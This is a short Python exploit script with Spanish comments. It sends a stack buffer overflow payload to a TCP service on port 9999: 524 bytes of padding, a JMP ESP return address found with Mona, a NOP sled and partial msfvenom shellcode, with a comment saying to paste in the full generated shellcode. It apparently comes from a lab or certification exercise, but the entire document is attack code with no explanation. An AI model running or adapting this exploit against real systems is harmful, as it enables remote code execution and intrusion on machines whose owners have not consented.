
#!/usr/bin/python3
import socket
from struct import pack

ip = "192.1.1.5"
port = 9999

# Offset determinado
offset = 524

# Dirección JMP ESP (obtenida con Mona)
eip = pack("<I", 0x311712F3)

# NOP sled + shellcode (ejemplo, reemplazar por el generado con msfvenom)
shellcode =  b"\x90" * 16
shellcode += (
    b"\xdb\xd6\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x52\xbe\xf9\x7a\xcd\x45"
    b"\x31\x77\x17\x03\x77\x17\x83\x0c\x36\x73"
    # Agregar aquí el shellcode completo generado con msfvenom
)

# Payload final
payload = b"A" * offset + eip + shellcode

# Envío al servicio
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(payload)
s.close()
